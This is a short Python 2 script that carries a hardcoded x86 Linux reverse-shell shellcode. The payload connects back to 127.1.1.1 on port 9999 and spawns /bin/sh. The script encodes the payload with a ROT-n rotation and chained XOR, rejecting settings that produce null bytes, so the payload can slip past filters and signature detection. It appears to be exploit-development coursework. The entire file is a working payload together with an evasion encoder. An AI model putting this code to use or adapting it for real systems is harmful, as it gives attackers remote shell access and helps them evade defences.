#!/usr/bin/python

import sys
from operator import xor

shellcode = "\x6a\x66\x58\x89\xc7\x6a\x01\x5b\x99\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x96\x89\xf8\x6a\x03\x5b\x68\x7f\x01\x01\x01\x66\x68\x27\x0f\x6a\x02\x59\x66\x51\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\x31\xc9\xb1\x02\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x6a\x0b\x58\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\x89\xca\xcd\x80"

def printUsage():
  print """\n\nUsage: {0} <n>\n
           \tn: is the number of rotations to be made.\n\n""".format(sys.argv[0])

def parseArgs():
  if len(sys.argv) < 2:
    printUsage()
    exit(1)
  return int(sys.argv[1]) % 256

def main():
  rot_n = parseArgs()
  shellcode_encoded = ''

  print "Generating ROT-{0} and XOR encoded shellcode".format(rot_n)

  shellcode_encoded = "\\x{0:0{1}x}".format(rot_n, 2)
  xor_op = rot_n
  for a in bytearray(shellcode):
    #print "\\x{0:0{1}x}".format(a, 2),

    b = (a + rot_n) % 256
    c = xor(xor_op, b)

    if c == 0:
      print "\n\nNull byte detected! Change <n> parameter.\n\n"
      exit(2)

    shellcode_encoded += "\\x{0:0{1}x}".format(c, 2)
    xor_op = c

  #print "\n"
  print shellcode_encoded

if __name__ == '__main__':
  main()
  exit(0)
